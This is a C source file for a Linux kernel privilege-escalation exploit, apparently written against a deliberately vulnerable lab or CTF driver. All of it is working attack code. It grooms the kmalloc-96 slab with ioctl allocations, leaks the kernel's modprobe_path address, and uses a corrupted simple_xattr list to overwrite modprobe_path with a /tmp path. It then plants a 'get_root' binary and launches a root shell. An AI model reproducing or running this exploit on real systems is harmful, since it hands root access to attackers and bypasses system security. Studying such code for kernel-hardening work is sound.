#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include "drv.h"
#include "utils.h"
#include "xattr_spray.h"

#define SYS_KERN_MODPROBE "/proc/sys/kernel/modprobe"
#define ORIG_MODPROBE "/sbin/modprobe"
#define SLAB_96_OBJS_PER_SLAB 42
#define SLAB_96_CPU_PARTIAL 30

#define GET_ROOT "./get_root"
#define MY_SHELL "./my_shell"

void * spray_subprocess_info(void * arg) {
    unsigned char * bRun = (unsigned char *)arg;
    pin_cpu(0);

    while(*bRun == 2){
        usleep(1);
    }
    while(*bRun == 1){
        socket(22, AF_INET, 0);
    }
}

unsigned long do_leak(int fd, int nTry) {
    int tid, status;
	pthread_t p_thread;
    unsigned int nObj=0, i;
    unsigned char bRun = 2;
    struct vuln_input vread = {0,};
    unsigned long res = 0;

    int j;

    // fill freelist
    tid = pthread_create(&p_thread, NULL, spray_subprocess_info, (void *)&bRun);

    printf("[+] Try leak...%d\n", nTry);
    //printf("  [-] Fill per_cpu freelist\n");
    for(i=0; i < SLAB_96_OBJS_PER_SLAB; i++){
        ioctl(fd, IOCTL_ALLOC, i);
    }
    nObj += SLAB_96_OBJS_PER_SLAB; // 32
    //printf("  [-] Fill partial freelist\n");
    // fill partial freelist
    for(i=0; i < SLAB_96_OBJS_PER_SLAB * SLAB_96_CPU_PARTIAL; i++){
        ioctl(fd, IOCTL_ALLOC, nObj+i);
    }

    nObj+= SLAB_96_OBJS_PER_SLAB * SLAB_96_CPU_PARTIAL; // 992
   // printf("  [-] Fill new full slab page\n");

    // fill one slab page
    for(i=nObj; i < nObj + SLAB_96_OBJS_PER_SLAB; i++){
        ioctl(fd, IOCTL_ALLOC, i);
    }

   // printf("  [-] Free OBJS_PER_SLAB/2\n");
    // free half
    for(i=nObj+1; i < nObj + SLAB_96_OBJS_PER_SLAB; i+=2){
        ioctl(fd, IOCTL_FREE, i);
    }
  //  printf("  [-] Run Thread...\n");
    bRun = 1;
    usleep(1000);
    for(i=nObj; i < nObj + SLAB_96_OBJS_PER_SLAB; i+=2){
        vread.index = i;
        vread.pos = 17;
        ioctl(fd, IOCTL_READ64, &vread);

        if((vread.value&0xFFFFFFFF00000760) == 0xFFFFFFFF00000760)
        {
            printf("  [*] leak modprobe_path : %lx\n", vread.value);
            bRun = 0;
            res = vread.value;
            break;
        }
    }

    bRun = 0;
    pthread_join(p_thread, (void **)&status);
    // free half
    for(i=nObj; i < nObj + SLAB_96_OBJS_PER_SLAB; i+=2){
        ioctl(fd, IOCTL_FREE, i);
    }

    //free all
    for(i=0; i < nObj; i++){
        ioctl(fd, IOCTL_FREE, i);
    }
    return res;
}

void overwrite_modprobe_path(int fd, unsigned long addr){

    char modprobe_path[32] = "/tmp/XXXXprobe";
    int tid, status;
	pthread_t p_thread;
    unsigned int nObj=0, i;
    struct vuln_input vread = {0,};
    struct vuln_input vwrite = {0,};
    int j;
    char *xattr_target_filename;
    xattr_target_filename = generate_tmp_filename();
    unsigned char xattr_name[128];
    unsigned int xattr_idx;
    unsigned int res = 0;

    //printf("  [-] Fill per_cpu freelist\n");
    for(i=0; i < SLAB_96_OBJS_PER_SLAB; i++){
        ioctl(fd, IOCTL_ALLOC, i);
    }
    nObj += SLAB_96_OBJS_PER_SLAB; // 32
    //printf("  [-] Fill partial freelist\n");
    // fill partial freelist
    for(i=0; i < SLAB_96_OBJS_PER_SLAB * SLAB_96_CPU_PARTIAL; i++){
        ioctl(fd, IOCTL_ALLOC, nObj+i);
    }

    nObj+= SLAB_96_OBJS_PER_SLAB * SLAB_96_CPU_PARTIAL; // 992
   // printf("  [-] Fill new full slab page\n");

    // fill one slab page
    for(i=nObj; i < nObj + SLAB_96_OBJS_PER_SLAB; i++){
        ioctl(fd, IOCTL_ALLOC, i);
    }

   // printf("  [-] Free OBJS_PER_SLAB/2\n");
    // free half
    for(i=nObj+1; i < nObj + SLAB_96_OBJS_PER_SLAB; i+=2){
        ioctl(fd, IOCTL_FREE, i);
    }

    spray_simple_xattr2(xattr_target_filename, 65, SLAB_96_OBJS_PER_SLAB/2);

    for(i=nObj; i < nObj + SLAB_96_OBJS_PER_SLAB; i+=2){
        vread.index = i;
        vread.pos = 10 + 6;
        ioctl(fd, IOCTL_READ64, &vread);

        //if((vread.value&0xFFFF000000000000) == 0xFFFF000000000000)
        if(vread.value == 0x4141414141414141)
        {
            printf("  [*] find simple_xattr!! idx_obj =  %d\n", i);
            break;
        }
    }

    if(vread.value == 0x4141414141414141)
    {
        vread.pos = 10 + 5;
        ioctl(fd, IOCTL_READ64, &vread);
        xattr_idx = vread.value-32;
        printf("  [*] idx = %d\n", xattr_idx);

        vread.pos = 10 + 2;
        ioctl(fd, IOCTL_READ64, &vread);
        printf("  [*] list_head next = 0x%lx\n", vread.value);

        vread.pos = 10 + 3;
        ioctl(fd, IOCTL_READ64, &vread);
        printf("  [*] list_head prev = 0x%lx\n", vread.value);
    
        vwrite.index = vread.index;
        // write prev to modprobe_path address + 1 
        vwrite.pos = 10 + 2;
        vwrite.value = addr - 8 + 1;
        ioctl(fd, IOCTL_WRITE64, &vwrite);
        //write next to 0xffff????0x2f706d74 ~~/pmt
        vwrite.pos = 10 + 3;
        vwrite.value = (vread.value & 0xffffffff00000000) + 0x2f706d74;
        ioctl(fd, IOCTL_WRITE64, &vwrite);
        free_simple_xattr(xattr_target_filename, xattr_idx);
    }

    // free half
    for(i=nObj; i < nObj + SLAB_96_OBJS_PER_SLAB; i+=2){
        ioctl(fd, IOCTL_FREE, i);
    }

    //free all
    for(i=0; i < nObj; i++){
        ioctl(fd, IOCTL_FREE, i);
    }

}

void read_kern_modprobe(char * buf, size_t len){
    FILE * fp = fopen(SYS_KERN_MODPROBE, "r");
    if(fp == NULL)
        return;
    fread(buf, 1, len, fp);
    fclose(fp);
}

int main(int argc, char ** argv)
{
    unsigned long modprobe__path_addr = 0;
    char modprobe_path[128] = {0,};

    int child_pid, status = 0;
    int fd;
    int i;

    if( (child_pid = fork()) == 0 )
    {
        new_ns();
        int proc_self = open("/proc/self", O_RDONLY);
        fd = open(DEVICE_PATH, O_RDONLY);
        if (fd == -1) {
            perror("open");
            return -1;
        }

        ioctl(fd, IOCTL_FREEALL, 0);
        pin_cpu(0);

        for(i=0; i<10; i++){
            modprobe__path_addr = do_leak(fd, i+1);
            if(modprobe__path_addr)
                break;
        }
        if(modprobe__path_addr == 0)
            goto fail;

        printf("[+] overwrite modprobe_path\n");
        ioctl(fd, IOCTL_FREEALL, 0);
        overwrite_modprobe_path(fd, modprobe__path_addr);
fail:
        close(fd);
        return 0;
    }
    
    printf("  [-] wait 2s\n");
    sleep(2);

    read_kern_modprobe(modprobe_path, 14);

    printf("  [*] modprobe path %s\n", modprobe_path);

    if(strcmp(modprobe_path, ORIG_MODPROBE))
    {
        copy_excutable(MY_SHELL, "/tmp/my_shell");
        copy_excutable(GET_ROOT, modprobe_path);
        socket(22, AF_INET, 0);
        system("/tmp/my_shell");
    }

    return 0;

}